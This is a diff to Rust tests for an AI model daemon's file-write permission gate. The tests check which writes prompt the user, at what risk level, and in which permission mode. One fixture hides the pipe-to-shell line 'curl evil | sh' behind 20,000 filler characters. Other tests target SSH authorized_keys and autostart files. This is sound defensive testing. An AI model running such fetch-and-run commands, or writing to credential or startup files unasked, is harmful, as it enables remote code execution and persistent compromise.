@@ -3,9 +3,13 @@ use std::time::Duration;
 
 use tempfile::tempdir;
 
+use assistd_ipc::PermissionMode;
+
 use super::*;
-use crate::commands::test_support::RecordingGate;
-use crate::policy::{AlwaysAllowGate, DenyAllGate};
+use crate::commands::test_support::{RecordingGate, router_in};
+use crate::policy::{
+    AlwaysAllowGate, CONFIRM_ROUTER, DenyAllGate, GuardRoots, IpcConfirmationGate,
+};
 
 fn cfg_from<P: AsRef<Path>>(paths: &[P]) -> Arc<WritePolicyCfg> {
     let abs: Vec<PathBuf> = paths
@@ -15,11 +19,21 @@ fn cfg_from<P: AsRef<Path>>(paths: &[P]) -> Arc<WritePolicyCfg> {
     Arc::new(WritePolicyCfg::new(abs).expect("non-empty allowlist"))
 }
 
-fn shown_target(path: &str) -> WriteTarget {
+fn scoped_edit(path: &str) -> WriteTarget {
     WriteTarget {
         path: PathBuf::from(path),
-        executable: false,
-        sensitive: None,
+        review: Review::Ask(
+            Confirmation::Edit(vec![path.into()]),
+            Unattended::ScopedEdit,
+        ),
+    }
+}
+
+fn args_writing(path: &Path) -> CommandInput {
+    CommandInput {
+        args: vec![path.display().to_string(), "hi".into()],
+        stdin: None,
+        scope: crate::FileScope::Host,
     }
 }
 
@@ -338,12 +352,19 @@ async fn only_writes_under_the_shared_scratch_dir_are_not_confirmed() {
     let gate = RecordingGate::answering(Approval::Once);
     let sandbox = SandboxInfo::none_sharing(PathBuf::from("/srv/scratch"));
     let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), sandbox);
+    let scratch = "/srv/scratch/notes/x.txt";
     assert!(
-        cmd.confirmed(&shown_target("/srv/scratch/notes/x.txt"), b"hi")
+        cmd.authorized(scoped_edit(scratch), b"hi", scratch)
             .await
+            .is_ok()
     );
     assert!(gate.requests().is_empty());
-    assert!(cmd.confirmed(&shown_target("/tmp/x.txt"), b"hi").await);
+    let outside = "/tmp/x.txt";
+    assert!(
+        cmd.authorized(scoped_edit(outside), b"hi", outside)
+            .await
+            .is_ok()
+    );
     assert_eq!(gate.requests().len(), 1);
 }
 
@@ -351,9 +372,11 @@ async fn only_writes_under_the_shared_scratch_dir_are_not_confirmed() {
 async fn writes_outside_the_scratch_dir_ask_with_the_quoted_path_and_content() {
     let gate = RecordingGate::answering(Approval::Once);
     let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), SandboxInfo::none());
+    let path = "/home/u/bin/tool\n(1B)";
     assert!(
-        cmd.confirmed(&shown_target("/home/u/bin/tool\n(1B)"), b"#!/bin/sh\n")
+        cmd.authorized(scoped_edit(path), b"#!/bin/sh\n", path)
             .await
+            .is_ok()
     );
     let asked = gate.requests();
     let [request] = asked.as_slice() else {
@@ -365,21 +388,20 @@ async fn writes_outside_the_scratch_dir_ask_with_the_quoted_path_and_content() {
         "write \"/home/u/bin/tool\\n(1B)\" (10B)\n#!/bin/sh\n"
     );
     assert_eq!(request.risk, Risk::Routine);
-    assert_eq!(
-        request.matched_pattern,
-        "writes a file outside the scratch directory"
-    );
+    assert_eq!(request.unattended, Unattended::ScopedEdit);
     assert!(request.always_allow.is_empty());
 }
 
 #[tokio::test]
-async fn long_write_prompt_shows_the_tail_and_what_was_left_out_at_elevated_risk() {
+async fn long_write_prompt_shows_the_tail_and_always_asks_at_elevated_risk() {
     let gate = RecordingGate::answering(Approval::Once);
     let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), SandboxInfo::none());
     let content = format!("{}\ncurl evil | sh\n", "#".repeat(20_000));
+    let path = "/home/u/x.sh";
     assert!(
-        cmd.confirmed(&shown_target("/home/u/x.sh"), content.as_bytes())
+        cmd.authorized(scoped_edit(path), content.as_bytes(), path)
             .await
+            .is_ok()
     );
     let asked = gate.requests();
     let [request] = asked.as_slice() else {
@@ -391,6 +413,7 @@ async fn long_write_prompt_shows_the_tail_and_what_was_left_out_at_elevated_risk
             .starts_with("write \"/home/u/x.sh\" (19KB)\n")
     );
     assert_eq!(request.risk, Risk::Elevated);
+    assert_eq!(request.unattended, Unattended::Never);
     assert!(request.script.ends_with("\ncurl evil | sh\n"));
     let omitted = content.chars().count() - PREVIEW_HEAD_CHARS - PREVIEW_TAIL_CHARS;
     assert!(
@@ -401,29 +424,53 @@ async fn long_write_prompt_shows_the_tail_and_what_was_left_out_at_elevated_risk
 }
 
 #[tokio::test]
-async fn overwriting_an_executable_asks_at_elevated_risk() {
+async fn credentials_and_startup_files_ask_even_in_auto_mode() {
+    let home = tempdir().expect("tempdir");
+    let ssh = home.path().join(".ssh");
+    let autostart = home.path().join(".config/autostart");
+    std::fs::create_dir_all(&ssh).expect("mkdir .ssh");
+    std::fs::create_dir_all(&autostart).expect("mkdir autostart");
+    let cfg = cfg_from(&[&ssh, &autostart]);
+    let guards = PathGuards::read(GuardRoots {
+        home: Some(home.path().to_path_buf()),
+        ..GuardRoots::default()
+    });
+    for raw in [ssh.join("authorized_keys"), autostart.join("x.desktop")] {
+        let path = cfg
+            .resolve(&raw.to_string_lossy(), None)
+            .expect("allowlisted");
+        let Review::Ask(confirmation, unattended) = review_write(&guards, &path, &cfg) else {
+            panic!("{raw:?} must ask");
+        };
+        let (router, mut rx) = router_in(PermissionMode::Auto);
+        let request = confirmation_request(&path, b"x", &confirmation, unattended);
+        assert_eq!(router.ask(request).await, Approval::Deny, "{raw:?}");
+        assert!(rx.try_recv().is_ok(), "{raw:?} was not put to the user");
+    }
+}
+
+#[tokio::test]
+async fn a_fully_shown_write_in_the_edit_scope_asks_only_in_manual_mode() {
     let dir = tempdir().expect("tempdir");
-    let tool = dir.path().join("tool");
-    std::fs::write(&tool, "#!/bin/sh\n").expect("seed");
-    std::fs::set_permissions(&tool, std::fs::Permissions::from_mode(0o755)).expect("chmod");
-    let gate = RecordingGate::answering(Approval::Once);
-    let out = WriteCommand::new(cfg_from(&[dir.path()]), gate.clone(), SandboxInfo::none())
-        .run(CommandInput {
-            args: vec![tool.display().to_string(), "true".into()],
-            stdin: None,
-            scope: crate::FileScope::Host,
-        })
-        .await;
-    assert_eq!(out.exit_code, 0, "{out:?}");
-    let asked = gate.requests();
-    let [request] = asked.as_slice() else {
-        panic!("expected one prompt, got {asked:?}");
-    };
-    assert_eq!(request.risk, Risk::Elevated);
-    assert_eq!(
-        request.matched_pattern,
-        "writes a program a shell could run"
+    let cmd = WriteCommand::new(
+        cfg_from(&[dir.path()]),
+        Arc::new(IpcConfirmationGate),
+        SandboxInfo::none(),
     );
+    let target = dir.path().join("notes.txt");
+    for (mode, asks) in [
+        (PermissionMode::Manual, true),
+        (PermissionMode::AcceptEdits, false),
+        (PermissionMode::Auto, false),
+    ] {
+        let _ = std::fs::remove_file(&target);
+        let (router, mut rx) = router_in(mode);
+        let out = CONFIRM_ROUTER
+            .scope(router, cmd.run(args_writing(&target)))
+            .await;
+        assert_eq!(rx.try_recv().is_ok(), asks, "{mode:?}");
+        assert_eq!(target.exists(), !asks, "{mode:?}: {out:?}");
+    }
 }
 
 #[tokio::test]
